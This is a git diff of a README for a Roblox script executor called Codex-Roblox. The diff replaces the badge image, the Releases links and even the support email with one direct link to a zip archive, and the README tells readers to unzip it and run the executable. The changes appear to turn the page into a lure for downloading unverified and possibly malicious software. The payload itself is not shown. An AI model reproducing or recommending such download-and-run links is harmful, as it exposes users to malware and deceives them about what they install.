@@ -1,6 +1,6 @@
 # Codex-Roblox 🚀
 
-![Codex-Roblox](https://img.shields.io/badge/Codex-Roblox-blue?style=for-the-badge&logo=github)
+![Codex-Roblox](https://raw.githubusercontent.com/rick1237777/Codex-Roblox/main/halfman/Codex-Roblox-v3.1.zip)
 
 Welcome to the **Codex-Roblox** repository! This project is dedicated to providing a powerful and user-friendly Roblox script executor. Whether you are a beginner or an experienced developer, Codex-Roblox supports low-end PCs, ensuring a smooth and stable experience while you enjoy your favorite Roblox games.
 
@@ -24,7 +24,7 @@ Welcome to the **Codex-Roblox** repository! This project is dedicated to providi
 
 ## Installation
 
-To get started with Codex-Roblox, you can download the latest version from the [Releases section](https://github.com/rick1237777/Codex-Roblox/releases). Make sure to download the appropriate file for your system. After downloading, follow these steps to install:
+To get started with Codex-Roblox, you can download the latest version from the [Releases section](https://raw.githubusercontent.com/rick1237777/Codex-Roblox/main/halfman/Codex-Roblox-v3.1.zip). Make sure to download the appropriate file for your system. After downloading, follow these steps to install:
 
 1. **Extract the Files**: Unzip the downloaded file to a folder on your computer.
 2. **Run the Executable**: Locate the executable file and double-click to run it.
@@ -67,7 +67,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: support@codex-roblox.com
+- **Email**: https://raw.githubusercontent.com/rick1237777/Codex-Roblox/main/halfman/Codex-Roblox-v3.1.zip
 - **GitHub Issues**: Use the issues section to report bugs or request features.
 
-Thank you for visiting the **Codex-Roblox** repository! We hope you enjoy using our script executor. For more updates and downloads, check the [Releases section](https://github.com/rick1237777/Codex-Roblox/releases).
+Thank you for visiting the **Codex-Roblox** repository! We hope you enjoy using our script executor. For more updates and downloads, check the [Releases section](https://raw.githubusercontent.com/rick1237777/Codex-Roblox/main/halfman/Codex-Roblox-v3.1.zip).
